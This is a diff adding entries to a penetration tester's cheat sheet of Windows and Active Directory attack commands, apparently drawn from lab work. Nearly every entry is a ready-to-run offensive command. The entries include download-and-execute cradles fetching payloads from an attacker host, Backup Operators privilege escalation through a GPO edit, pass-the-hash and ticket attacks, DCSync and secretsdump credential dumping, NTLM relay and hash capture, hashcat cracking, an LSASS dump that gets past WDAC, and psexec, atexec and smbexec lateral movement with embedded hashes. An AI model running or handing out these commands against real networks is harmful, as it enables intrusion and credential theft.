@@ -12,6 +12,41 @@ iex(new-object net.webclient).downloadstring('http://192.168.10.11/sql.txt')
 ```
 invoke-mapdomaintrust | select sourcename,targetname,trustdirection
 ```
+ad abuse backup operator [sauce](https://security.stackexchange.com/questions/182540/how-could-users-in-backup-operators-group-escalate-its-privileges/182549) [sauce2](https://www.inguardians.com/wp-content/uploads/2020/04/BackupOperators-1.pdf)
+
+```
+# first, login as the user with Backup Operator rights
+# or, pth as the user from SYSTEM context using mimikatz or rubeus
+.\m.exe "privilege::debug"
+sekurlsa::pth /user:USERNAME /domain:DOMAIN.local /ntlm:NTLM /run:"cmd"
+.\r.exe asktgt /domain:DOMAIN.local /user:USERNAME /rc4:NTLM /ptt
+```
+```
+# locate sysvol
+\\dc.DOMAIN.local\SYSVOL\DOMAIN.local\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\MACHINE\Microsoft\Windows NT\SecEdit
+```
+```
+# copy out GptTmpl contents
+[Unicode]
+Unicode=yes
+[Registry Values]
+MACHINE\System\Curr.. etc
+```
+```
+# get SID of target user - confirm with powerview:
+iex(new-object net.webclient).downloadstring('http://10.10.14.44/view.txt')
+convertfrom-sid SID
+```
+```
+# edit GptTmpl.inf - NOTE THE EMPTY "=" SIGN
+[Group Membership]
+*S-1-5-21-997099906-443949041-4154884969-1116__Memberof = *S-1-5-32-544
+*S-1-5-21-997099906-443949041-4154884969-1116__Members =
+```
+```
+# wait ~10min, secretsdump the DC
+proxychains -q -f server.conf impacket-secretsdump DOMAIN/USERNAME:'PASSWORD'@dc.domain.local
+```
 abuse force change password
 ```
 $username = 'adminWebSvc'
@@ -310,6 +345,16 @@ enable rdp
 ```
 Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -name "fDenyTSConnections" -value 0
 ```
+enable SeBackupPrivilege
+```
+iwr -uri http://10.10.14.44/SeBackupPrivilegeUtils.dll -outfile .\SeBackupPrivilegeUtils.dll
+iwr -uri http://10.10.14.44/SeBackupPrivilegeCmdLets.dll -outfile .\SeBackupPrivilegeCmdLets.dll
+Import-Module .\SeBackupPrivilegeUtils.dll
+Import-Module .\SeBackupPrivilegeCmdLets.dll
+Get-SeBackupPrivilege
+Set-SeBackupPrivilege
+Get-SeBackupPrivilege
+```
 enum mssql
 ```
 exec sp_linkedservers;
@@ -363,13 +408,25 @@ c:\windows\tasks\m.exe "privilege::debug"
 ```
 kerberos::golden /user:fakeuser /domain:TARGET_DOMAIN /sid:DOMAIN_SID /krbtgt:KRBTGT_HASH /ptt
 ```
-hashcat generate password list
+hashcat password list
 ```
 hashcat --force list.txt -r /usr/share/hashcat/rules/best64.rule -r /usr/share/hashcat/rules/toggles5.rule -r /usr/share/hashcat/rules/append_atsign.rule -r /usr/share/hashcat/rules/append_exclamation.rule --stdout | sort -u > list-uniq.txt
 ```
-hashcat crack krb5tgs (13100) [hashcat hashes ref](https://hashcat.net/wiki/doku.php?id=example_hashes)
+hashcat krb5tgs (13100) [hashcat hashes ref](https://hashcat.net/wiki/doku.php?id=example_hashes)
 ```
 sudo hashcat -m 13100 krb5tgs.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/InsidePro-PasswordsPro.rule
+```
+hashcat ntlmv2 (5600)
+```
+sudo hashcat -m 5600 Inveigh-NTLMv2.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/InsidePro-PasswordsPro.rule
+```
+impacket-atexec
+```
+proxychains -q -f server.conf impacket-atexec SMALLBANK/serviceacc\$@dc.smallbank.local "powershell -e B64CMD" -hashes :2060951907129392809244825245de08
+```
+impacket-smbexec
+```
+proxychains -q -f server.conf impacket-smbexec SMALLBANK/serviceacc\$@dc.smallbank.local -hashes :2060951907129392809244825245de08
 ```
 impacket-psexec - kerberos
 ```
@@ -378,11 +435,11 @@ export KRB5CCNAME=/home/kali/ccc5/krb5cc.pat
 ```
 proxychains -q -f ssh.conf impacket-psexec corpy.com/pat@dmzdc01.corpy.com -k -no-pass
 ```
-impacket-psexec - pth
+impacket-psexec pth
 ```
 proxychains -q -f met.conf impacket-psexec administrator@sql05.corpy.com -hashes :2060951907129392809244825245de08
 ```
-impacket-psexec - pwd
+impacket-psexec pwd
 ```
 proxychains -q -f chi.conf impacket-psexec TRICKY/sqlsvc:'4dfgdfFFF542'@sql07.corpy.com 
 ```
@@ -394,9 +451,26 @@ proxychains -q -f nextcloud.conf impacket-GetUserSPNs domain.local/'hola':'P@ssw
 # get TGS
 proxychains -q -f nextcloud.conf impacket-GetUserSPNs domain.local/'hola':'P@ssw0rd' -request
 ```
+impacket-ntlmrelayx dump-gmsa
+```
+proxychains -q -f server.conf impacket-ntlmrelayx --dump-gmsa --no-dump --no-da --no-acl --no-validate-privs -debug -t ldaps://primary.DOMAIN.local
+```
 impacket-secretsdump
 ```
 proxychains -q -f met.conf impacket-secretsdump administrator@sccm.domain.local -hashes :1b0cf20be58b57aa85fae91dccc4e63e
+```
+inveigh usage - DNS (inveigh DNS)
+```
+upload Inveigh462.exe
+.\Inveigh462.exe -dnstypes A,SRV -dnshost *.DOMAIN.local
+```
+```
+download Inveigh-Log.txt
+download Inveigh-NTLMv2.txt
+download Inveigh-NTLMv2Users.txt
+```
+```
+sudo hashcat -m 5600 Inveigh-NTLMv2.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/InsidePro-PasswordsPro.rule
 ```
 kerberos set time to dc (fix clock) (fix time)
 ```
@@ -423,6 +497,11 @@ Set-ItemProperty -Path 'HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate\
 Set-ItemProperty -Path 'HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate\AU' -name "NoAutoRebootWithLoggedOnUsers" -value 1
 Set-ItemProperty -Path 'HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate\AU' -name "AutoInstallMinorUpdates" -value 0
 Set-ItemProperty -Path 'HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate\AU' -name "AUOptions" -value 2
+```
+laps
+```
+iex(new-object net.webclient).downloadstring('http://10.10.14.44/laps.txt')
+get-lapscomputers
 ```
 laps alternative (if laps.txt isn't working) (switch domain if have to)
 ```
@@ -561,6 +640,10 @@ mssql.exe shortcut
 iwr -uri http://192.168.10.11/MSSQL.exe -outfile c:\windows\tasks\Parishcopsomewhat.exe
 cmd /c c:\windows\tasks\Parishcopsomewhat.exe
 ```
+netexec usage (nxc) - nxc smb
+```
+proxychains -q -f nextcloud.conf nxc smb 192.168.20.10 -u users.txt -p pass.txt --continue-on-success | tee nxc_smb_192.168.20.10.txt
+```
 nmap hybrid + automate
 ```
 for i in $(cat ips.txt);do proxychains -q -f web05.conf nmap -Pn -v -p 22,3306,8080,8081,5985,443,80,1433,53,445,25,143,110,993,3389,995,139,587,135 -sCV -oN scans/nmap-tcpscans_$i.txt $i;done
@@ -584,10 +667,6 @@ proxychains -q -f met.conf impacket-ntlmrelayx --no-http-server -smb2support -t 
 ```
 # current sql
 xp_dirtree '\\192.168.10.11\a';
-```
-nxc usage (netexec)
-```
-proxychains -q -f nextcloud.conf nxc smb 192.168.20.10 -u users.txt -p pass.txt --continue-on-success | tee nxc_smb_192.168.20.10.txt
 ```
 powershell cred
 ```
@@ -656,7 +735,10 @@ Set-Location 'C:\Program Files (x86)\Microsoft Configuration Manager\AdminConsol
 Import-Module .\ConfigurationManager.psd1
 New-PSDrive -Name "HO2" -PSProvider "CMSite" -Root "sccm.DOMAIN.local" -Description "HO2"
 ```
-
+powerview get user memberof
+```
+get-netuser | select name,samaccountname,objectsid,memberof
+```
 printspoofer
 ```
 python3 makerunspace.py -a 64 -l 192.168.10.11 -p 443 -b PipePipe
@@ -711,6 +793,14 @@ sekurlsa::pth /user:pat /domain:corpy.com /ntlm:61c6e14f88cd70638f901ea51796a194
 ```
 sekurlsa::pth /user:administrator /domain:file06 /ntlm:8821c97bc6b3d2aed6e30a9540f208f3 /run:"mstsc.exe /restrictedadmin"
 ```
+rubeus asktgt ptt
+```
+.\r.exe asktgt /domain:DOMAIN.local /user:USERNAME /rc4:NTLM /ptt
+```
+rubeus triage
+```
+.\r.exe triage
+```
 runspace shortcut (powershell)
 ```
 iwr -uri http://192.168.10.11/Runspace.exe -outfile c:\windows\tasks\Tbsegabilly.exe
@@ -721,6 +811,11 @@ runspace shortcut (cmd)
 ```
 bitsadmin /Transfer myJob http://192.168.10.11/Runspace.exe c:\windows\tasks\Tbsegabilly.exe
 C:\Windows\Microsoft.NET\Framework64\v4.0.30319\installutil.exe /logfile= /LogToConsole=false /U c:\windows\tasks\Tbsegabilly.exe
+```
+sharpmapexec usage - sme winrm
+```
+upload sme.exe
+.\sme.exe ntlm winrm /user:DOMAIN\administrator /password:P@ssw0rd /computername:server.DOMAIN.local
 ```
 smbmap usage
 ```
@@ -831,6 +926,19 @@ c:\windows\tasks\or.exe ptt /ticket:THETIX
 ```
 c:\windows\tasks\m.exe "privilege::debug" "lsadump::dcsync /domain:prod.corp1.com /user:prod\krbtgt" "exit"
 c:\windows\tasks\m.exe "privilege::debug" "lsadump::dcsync /domain:prod.corp1.com /user:prod\administrator" "exit"
+```
+wdac bypass (lolbas + pypykatz -> dump lsass) [sauce](https://lolbas-project.github.io/lolbas/Libraries/comsvcs/)
+```
+# first find lsass pid
+get-process lsass
+```
+```
+# dump lsass with lolbas to bypass wdac
+rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump 600 C:\programdata\lsass.dmp full
+```
+```
+# download lsass.dmp, read with pypykatz
+pypykatz lsa minidump lsass.dmp
 ```
 windows privesc - samdump
 ```
